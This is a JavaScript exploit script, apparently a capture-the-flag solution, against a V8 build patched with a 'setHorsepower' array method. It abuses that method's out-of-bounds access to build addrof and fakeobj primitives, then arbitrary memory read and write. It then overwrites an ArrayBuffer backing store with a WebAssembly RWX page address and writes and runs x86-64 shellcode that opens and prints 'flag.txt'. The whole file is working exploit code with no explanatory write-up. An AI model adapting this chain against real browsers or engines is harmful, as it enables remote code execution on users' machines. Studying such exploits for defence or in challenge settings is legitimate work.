var aux_float_arr = [1.1, 2.2, 3.3];
var aux_arr = aux_float_arr.setHorsepower(100) 
var aux_obj = { "a": 1 }
var aux_obj_arr = [aux_obj];

var aux_float_arr_fake = [1.1, 2.2, 3.3];
var aux_arr_fake = aux_float_arr_fake.setHorsepower(100) 

var fixer_float_array = [1.1, 2.2, 3.3];
var fixer_array = fixer_float_array.setHorsepower(100);
//change element pointer of fixer array to point aux_arr_fake
var fixer_array_ptr = fixer_array[4]


var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val, size) {
    f64_buf[0] = val;
    if (size == 32) {
        return BigInt(u64_buf[0]);
    } else if (size == 64) {
        return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
    }
}

function itof(val, size) {
    if (size == 32) {
        u64_buf[0] = Number(val & 0xffffffffn);
    } else if (size == 64) {
        u64_buf[0] = Number(val & 0xffffffffn);
        u64_buf[1] = Number(val >> 32n);
    }
    return f64_buf[0];
}

function dp(x){
  //%DebugPrint(x);
}

var flt_arr_map = ftoi(aux_arr[3], 32);
var elem_arr_ptr = ftoi(aux_arr[4], 32);
console.log("[+] aux_float_arr map: 0x" + flt_arr_map.toString(16));
console.log("[+] aux_float_arr element pointer: 0x" + elem_arr_ptr.toString(16));

//offset might be different, adjust accordingly such that elem_obj_arr = element pointer of DebugPrint(obj_arr)
//var elem_obj_arr = elem_arr_ptr - 0xc4n
var elem_obj_arr = elem_arr_ptr + 0x5Cn 
var obj_arr_map = ftoi(aux_arr[12],32);
console.log("[+] aux_obj_arr map = 0x" + obj_arr_map.toString(16)) 


//%DebugPrint(aux_obj_arr) , elem_obj_arr should be same address as aux_obj_arr elements
console.log("[+] aux_obj_arr element pointer = 0x" + elem_obj_arr.toString(16)) 

//change the element pointer of aux_arr to that of the object array
//since the element pointer of object array is pointing to the obj
//now reading index 0 of aux_arr will return address of obj
aux_arr[4] = itof((ftoi(aux_arr[4], 64) & 0xffffffff00000000n) + elem_obj_arr, 64);

var fixer_array_ptr = ftoi(fixer_array[4], 32);
console.log("[+] fixer_array_ptr element pointer: 0x" + fixer_array_ptr.toString(16));
var fixer_fake_array_ptr = fixer_array_ptr - 0x30n
console.log("[+] fake_float_array_ptr element pointer: 0x" + fixer_fake_array_ptr.toString(16));

//change element point of fixer to that of the fake_float_array
fixer_array[4] = itof((ftoi(fixer_array[4], 64) & 0xffffffff00000000n) + fixer_fake_array_ptr, 64);



function addrof(obj) { 
  //aux_arr = aux_float_arr.setHorsepower(5) // slice the array to access the map and the element pointer 
  //aux_arr[4] = itof((ftoi(aux_arr[4], 64) & 0xffffffff00000000n) + elem_obj_arr, 64); // Change the element pointer to the address of `obj_arr`'s element's 
  aux_obj_arr[0] = obj; // Place the object at 0th index 
  return ftoi(aux_arr[0], 32) // Get the address of the object 
}

function fakeobj(addr) { 
  let fake; 
  //console.log('testing1')
  fixer_array[3] = itof((ftoi(fixer_array[3], 64) & 0xffffffff00000000n) + flt_arr_map, 64); 

  //put the addr at index 0 which in an obj_array map supposed to be pointing to the object
  aux_arr_fake[0] = itof(addr, 32); 
  //console.log('testing2')

  //change the map of aux_arr
  aux_arr_fake[3] = itof((ftoi(aux_arr_fake[3], 64) & 0xffffffff00000000n) + obj_arr_map, 64); 
  //console.log('testing3')

  fake = aux_arr_fake[0];

  return fake; 
}

//aux_arr[0] = index 0 
//aux_arr[1] = index 1
//aux_arr[2] = index 2
//aux_arr[3] = map
//aux_arr[4] = element pointer

//run some tests to check if element pointer is correct
var c = [1.1, 1.2, 1.3]
var d = [1.1, 1.2, 1.3, 1.5]
var e = [1.1, 1.2, 1.3, 1.6, 1.7]
var f = [1 , 2]
//console.log(addrof(c).toString(16))
//console.log(addrof(d).toString(16))
//console.log(addrof(f).toString(16))


  var rw_helper = [itof(flt_arr_map, 64), 1.1, 2.2, 3.3];
  console.log("[+] rw_helper addr = " + addrof(rw_helper))
  var rw_helper_addr = addrof(rw_helper) & 0xffffffffn;

  console.log("[+] Controlled RW helper address: 0x" + rw_helper_addr.toString(16));

  dp(rw_helper)
  //let fake = fakeobj(rw_helper_addr - 0x20n); 
  //dp(fake)

function arb_read(addr) { 


  let fake = fakeobj(rw_helper_addr - 0x20n); 
  console.log("test");

  //set index 1 to be the address we want to read
  //index 1 should be the element pointer because it is after the map
  rw_helper[1] = itof((0x8n << 32n) + addr - 0x8n, 64); 
  return ftoi(fake[0], 64); 
}

function arb_write(addr, value) { 
  let fake = fakeobj(rw_helper_addr - 0x20n); 
  rw_helper[1] = itof((0x8n << 32n) + addr - 0x8n, 64);
  fake[0] = itof(value, 64); 
}



var arr_buf = new ArrayBuffer(0x100); 
var dataview = new DataView(arr_buf); 
var arr_buf_addr = addrof(arr_buf) & 0xffffffffn;; 


var back_store_addr = arb_read(arr_buf_addr + 0x14n);
console.log("[+] Back store pointer: 0x" + back_store_addr.toString(16));

var back_store_addr = arb_read(arr_buf_addr + 0x14n);

console.log("[+] arr_buf_addr address: 0x" + arr_buf_addr.toString(16)); 
console.log("[+] Back store pointer: 0x" + back_store_addr.toString(16));


var wasmCode = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 0, 11]);
var wasm_module = new WebAssembly.Module(wasmCode);
var wasm_instance = new WebAssembly.Instance(wasm_module);
var pwn = wasm_instance.exports.main;

var wasm_instance_addr = addrof(wasm_instance) & 0xffffffffn;
var rwx = arb_read(wasm_instance_addr + 0x68n);
console.log("[+] Wasm instance address: 0x" + wasm_instance_addr.toString(16));
console.log("[+] RWX section address: 0x" + rwx.toString(16));

arb_write(arr_buf_addr + 0x14n, rwx);

var shellcode = [ 0xe8,0x09,0x00,0x00,0x00,0x66,0x6c,0x61,0x67,0x2e,0x74,0x78,0x74,0x00,0x5f,0x48,0x31,0xc0,0x04,0x02,0x48,0x31,0xf6,0x0f,0x05,0x66,0x81,0xec,0xff,0x0f,0x48,0x8d,0x34,0x24,0x48,0x89,0xc7,0x48,0x31,0xd2,0x66,0xba,0xff,0x0f,0x48,0x31,0xc0,0x0f,0x05,0x48,0x31,0xff,0x40,0x80,0xc7,0x01,0x48,0x89,0xc2,0x48,0x31,0xc0,0x04,0x01,0x0f,0x05]
for (let i = 0; i < shellcode.length; i++) {
    dataview.setUint8(i, shellcode[i], true);
}
console.log("[+] Spawning a shell...");
pwn();
